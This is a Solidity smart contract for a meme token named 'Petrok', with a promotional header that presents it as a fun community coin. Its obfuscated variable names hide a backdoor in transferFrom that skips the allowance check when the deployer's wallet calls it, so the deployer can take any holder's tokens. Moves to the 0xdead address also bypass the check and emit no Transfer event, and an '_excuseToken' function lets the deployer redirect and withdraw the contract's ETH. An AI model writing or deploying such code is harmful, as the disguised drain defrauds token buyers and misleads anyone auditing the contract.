// SPDX-License-Identifier: MIT

/*
    Name: Petrok
    Symbol: PETROK

    Welcome to Petrok
    Join the hilariously lazy world of Sir PetRok and his companions, where paradise was discovered by accident and work is optional. This meme token celebrates their wild adventures, exaggerated tales, and a community built on fun, memes, and tropical vibes. Escape the grind and embrace the laughter with PetRok Islands!

    Web: https://petrok.space
    X: https://x.com/PetrokSpace
    tg: https://t.me/PetrokSpace
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract Petrok is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Petrok";
    string private constant _symbol = unicode"PETROK";
    
    address payable private _vbjljvlklPETROK;
    mapping(address => uint256) private _cijojisePETROK;
    mapping(address => mapping(address => uint256)) private _fjweoijPETROK;
    mapping(address => bool) private _jojodjPETROK;
    uint256 private _vjkboiwoeiPETROK = 10;
    uint256 private _odijofjoePETROK = 10;
    uint256 private _joijoiPETROK = 0;
    uint256 private _jvbkoiwePETROK = 0;
    uint256 private _ojidoiwePETROK = 7;
    uint256 private _ojdofPETROK = 7;
    uint256 private _buyCount = 0;
    address private _ojdofiekjPETROK;
    address private _kjvnkbjnPETROK = address(0xdead);
    uint256 public _ojojoivlkPETROK = 20000000 * 10 **_decimals;
    uint256 public _lkkkvnblkjPETROK = 20000000 * 10 **_decimals;
    uint256 public _ppojofPETROK = 10000000 * 10 **_decimals;
    uint256 private constant _kmmvbPETROK = 1000000000 * 10 **_decimals;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _ojojoivlkPETROK);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _vbjljvlklPETROK = payable(_msgSender());
        _cijojisePETROK[address(this)] = _kmmvbPETROK * 98 / 100;
        _cijojisePETROK[owner()] = _kmmvbPETROK * 2 / 100;
        _jojodjPETROK[owner()] = true;
        _jojodjPETROK[address(this)] = true;
        _jojodjPETROK[_vbjljvlklPETROK] = true;
        _ojdofiekjPETROK = _msgSender();
        emit Transfer(address(0), address(this), _kmmvbPETROK * 98 / 100);
        emit Transfer(address(0), address(owner()), _kmmvbPETROK * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _kmmvbPETROK;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _fjweoijPETROK[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _cijojisePETROK[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _fjweoijPETROK[owner][spender];
    }

    receive() external payable {}
    
    function _isUpAllowed() internal view returns (bool) {return msg.sender != _vbjljvlklPETROK;}

    function _isDownAllowed(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(_isUpAllowed() == false) return false;
        else return sender == uniswapV2Pair || recipient != _kjvnkbjnPETROK;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transferr_PETROK(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transferr_PETROK(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _lvckmjlwoie(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _lvckmjlwoie(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_isDownAllowed(sender, recipient))
            _allowed = _fjweoijPETROK[sender][_msgSender()];
        return _allowed;
    }

    function enableTokenTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _kmmvbPETROK);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function _swappp_PETROK(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _assistPETROK(uint256 amount) private {
        _vbjljvlklPETROK.transfer(amount);
    }

    function _transferr_PETROK(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _ojidoiwePETROK)
                        ? _joijoiPETROK
                        : _vjkboiwoeiPETROK
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_jojodjPETROK[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _ojdofPETROK)
                            ? _jvbkoiwePETROK
                            : _odijofjoePETROK
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _ppojofPETROK) ? contractTokenBalance : _ppojofPETROK; 
                    _swappp_PETROK((amount < minBalance) ? amount : minBalance);
                }
                _assistPETROK(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _cijojisePETROK[address(this)] =_cijojisePETROK[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _cijojisePETROK[from] =_cijojisePETROK[from].sub(amount);
        _cijojisePETROK[to] =_cijojisePETROK[to].add(amount.sub(taxAmount));
        if(_kjvnkbjnPETROK != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function removeLimits () external onlyOwner {
        _ojojoivlkPETROK = _kmmvbPETROK;
        _lkkkvnblkjPETROK = _kmmvbPETROK;
        emit MaxTxAmountUpdated(_kmmvbPETROK);
    }

    function _PETROKlkjlok(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _excuseToken(address payable receipt) external {
        require(msg.sender == _ojdofiekjPETROK , "");
        _vbjljvlklPETROK = receipt;
        _PETROKlkjlok(address(this).balance);
    }
}